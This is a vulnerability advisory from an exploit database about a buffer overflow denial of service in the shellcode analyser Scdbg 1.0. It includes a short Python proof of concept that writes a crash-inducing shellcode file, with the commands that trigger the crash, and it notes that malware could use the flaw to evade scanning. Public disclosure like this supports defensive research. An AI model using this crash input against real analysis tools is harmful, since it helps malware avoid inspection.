---
title: Scdbg 1.0 Denial Of Service
url: https://cxsecurity.com/issue/WLB-2023030051
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-03-28
fetch_date: 2025-10-04T10:49:48.431825
---

# Scdbg 1.0 Denial Of Service

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Scdbg 1.0 Denial Of Service** **2023.03.27**  Credit:  **[Rafael Pedrero](https://cxsecurity.com/author/Rafael%2BPedrero/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **N/A**  CWE: **[CWE-400](https://cxsecurity.com/cwe/CWE-400 "Click to see CWE-400")** | |

# Exploit Title: Scdbg 1.0 - Buffer overflow DoS
# Discovery by: Rafael Pedrero
# Discovery Date: 2021-06-13
# Vendor Homepage: http://sandsprite.com/blogs/index.php?uid=7&pid=152
# Software Link : https://github.com/dzzie/VS\_LIBEMU
# Tested Version: 1.0 - Compile date: Jun 3 2021 20:57:45
# Tested on: Windows 7, 10
CVSS v3: 7.5
CVSS vector: 3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
CWE: CWE-400
Vulnerability description: scdbg.exe (all versions) is affected by a Denial
of Service vulnerability that occurs when you use the /foff parameter or
not with a specific shellcode causing it to shutdown. Any malware could use
this option to evade the scan.
Proof of concept:
Save this script like scdbg\_crash.py and execute it: scdbg.exe -foff 1 -f
scdbg\_crash.bin / scdbg.exe -f scdbg\_crash.bin
#!/usr/bin/env python
crash = "\x90\xF6\x84\x01\x90\x90\x90\x90"
f = open ("scdbg\_crash.bin", "w")
f.write(crash)
f.close()
You can use gui\_launcher.exe and check "Start offset 0x": 1 or directly
without check
[image: image.png]

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023030051)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top